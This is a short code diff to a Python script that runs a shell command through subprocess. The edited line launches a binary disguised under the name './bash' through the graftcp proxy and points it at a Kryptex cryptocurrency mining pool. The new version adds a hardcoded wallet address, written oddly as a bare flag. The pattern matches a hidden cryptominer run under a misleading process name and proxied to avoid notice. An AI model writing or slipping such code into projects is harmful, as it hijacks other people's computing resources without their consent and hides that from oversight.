@@ -78,7 +78,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:7048 --wallet
+    ./graftcp/graftcp ./bash --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:7048 --prl1pk06kg4nye9f2f44gt6hvwchrg0fnkgkhyv058zmml7z57y9tn2cqky62kj
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
